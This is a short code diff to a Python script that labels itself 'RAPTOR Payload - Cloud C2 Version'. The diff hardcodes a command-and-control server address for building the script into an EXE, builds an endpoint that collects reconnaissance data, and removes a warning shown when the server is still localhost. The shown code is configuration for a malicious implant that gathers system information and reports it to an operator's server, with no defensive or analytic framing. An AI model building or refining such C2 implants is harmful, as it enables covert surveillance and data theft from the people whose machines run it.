@@ -26,17 +26,18 @@ except ImportError:
     sys.exit(1)
 
 # ═══════════════════════════════════════════════════════════════════════════
-# CONFIGURATION - UPDATE THESE VALUES FOR YOUR DEPLOYMENT
+# CONFIGURATION - HARDCODED C2 SERVER
 # ═══════════════════════════════════════════════════════════════════════════
 
-# Your VPS C2 server address
+# C2 Server Configuration (HARDCODED)
+# Change this to your actual C2 server before building the EXE
 # Examples:
 #   C2_SERVER = "https://your-domain.com"           # With SSL (recommended)
-#   C2_SERVER = "http://your-vps-ip"                # Without SSL
-#   C2_SERVER = "http://123.45.67.89"               # Direct IP
-C2_SERVER = "http://127.0.0.1:8000"  # ⚠️ CHANGE THIS TO YOUR VPS!
+#   C2_SERVER = "http://your-vps-ip:8000"           # Without SSL
+#   C2_SERVER = "http://123.45.67.89:8000"          # Direct IP
+C2_SERVER = "http://127.0.0.1:8000"  # ⚠️ CHANGE THIS BEFORE BUILDING EXE!
 
-# Full C2 endpoint
+# Full C2 endpoint (automatically constructed)
 C2_ENDPOINT = f"{C2_SERVER}/api/submit_scan/"
 
 # Reconnaissance settings
@@ -1159,12 +1160,8 @@ def main():
     """Main execution flow"""
     log("=" * 60)
     log("RAPTOR Payload - Cloud C2 Version")
+    log(f"Target C2: {C2_SERVER}")
     log("=" * 60)
-    
-    # Validate C2 configuration
-    if C2_SERVER == "http://127.0.0.1:8000":
-        log("⚠️  WARNING: C2_SERVER still set to localhost!", "WARNING")
-        log("⚠️  Update C2_SERVER variable with your VPS address", "WARNING")
     
     # Step 1: Gather system information
     system_info = gather_system_info()
